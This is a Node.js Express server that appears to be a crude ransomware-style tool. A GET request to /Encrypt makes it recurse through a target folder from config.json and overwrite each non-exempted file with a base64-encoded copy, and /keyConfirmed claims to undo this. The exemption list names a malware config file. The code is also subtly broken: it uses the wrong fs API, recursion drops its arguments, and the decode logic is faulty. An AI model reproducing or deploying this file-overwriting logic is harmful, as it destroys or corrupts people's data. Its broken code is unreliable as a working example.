const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const publicPath = path.join(process.cwd(), 'public');

app.use(express.static(publicPath));

app.get('/', (req, res)=>{
    res.sendFile(path.join(publicPath, 'index.html'));
});

/*Start of Process */

const key = btoa('Mhai');

const exemptedFiles = ['malware.config.json', 'test.exe'];

function isExempted(fileName , additinal) {
  return [...exemptedFiles,...additinal].includes(fileName);
}

function encodeData(data) {
  // Check if the data is already encoded
  if (data.includes('$')) {
    return data; // Already encoded, do nothing
  }
  return  '$' + btoa(data);
}

function decodeData(encodedData) {
  // Check if the string has the "$" sign
  if (!encodedData.includes('$')) {
    return atob(encodedData); // Not encoded, do nothing
  }

  // Remove the "$" sign and decode the string using atob
  const encodedPart = encodedData.split('$')[1];
  return encodedPart;
}

async function encodeAndWrite(path) {
  try {
    const data = await fs.readFile(path, 'utf-8');

    if (data.length === 0) {
      console.log(path, 'is Empty');
      return;
    }

    const encodedData = encodeData(data);
    console.log(path, 'Original data:', data);
    console.log(path, 'Encoded data:', encodedData);

    await fs.writeFile(path, encodedData, 'utf-8');
    console.log(path, 'File has been encoded and rewritten.\n');
  } catch (err) {
    console.log(`Error processing file ${path}: ${err}`);
  }
}

async function decodeAndWrite(path) {
  try {
    const encodedData = await fs.readFile(path, 'utf-8');

    if (encodedData.length === 0) {
      console.log(path, 'is Empty');
      return;
    }

    const decodedData = decodeData(encodedData);
    console.log(path, 'Encoded data:', encodedData);
    console.log(path, 'Decoded data:', decodedData);

    await fs.writeFile(path, decodedData, 'utf-8');
    console.log(path, 'File has been decoded and rewritten.\n');
  } catch (err) {
    console.log(`Error processing file ${path}: ${err}`);
  }
}

async function startEnc(p, wut, exemp) {
  try {
    const files = await fs.readdir(p);

    for (const file of files) {
      const filePath = path.join(p, file);
      const stats = await fs.stat(filePath);

      if (stats.isDirectory()) {
        console.log(`${filePath} is a directory`);
        await startEnc(filePath);
      } else if (stats.isFile()) {
        console.log(`${filePath} is a file`);
        if (!isExempted(file, exemp)) {
          if(wut){
            await decodeAndWrite(filePath);
          }else{
            await encodeAndWrite(filePath);
          }
        } else {
          console.log(`${file} is exempted from encoding or decoding.`);
        }
      }
    }
  } catch (err) {
    console.log(`Error reading directory ${p}: ${err}`);
  }
}


function readJsonFile(filePath) {
  // Use __dirname to get the directory where the script is located
  const jsonPath = path.join(process.cwd(), filePath);

  return fs.readFile(jsonPath, 'utf8')
      .then(data => {
          const jsonData = JSON.parse(data);
          return jsonData;
      })
      .catch(error => {
          console.log(`Error reading ${filePath}: ${error}`);
          throw error;
      });
}

// startEnc(target, true, exempted);

function main(state){
    readJsonFile('config.json').then((result)=>{
        console.log(result.ExemptedFiles)
        const target = path.join(__dirname, '..', result.target);
        startEnc(target, state, result.ExemptedFiles);
    });
}
/*End of Process*/

//Server side Method

app.get('/Encrypt',(req,res)=>{
  main(false)
  res.send('Encrypt is Done');
});

app.get('/keyConfirmed',(req,res)=>{
  main(true)
  res.send('Decompile is successfull!');
});


const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>{
    console.log(`Server is running on http://localhost:${PORT}`);
});
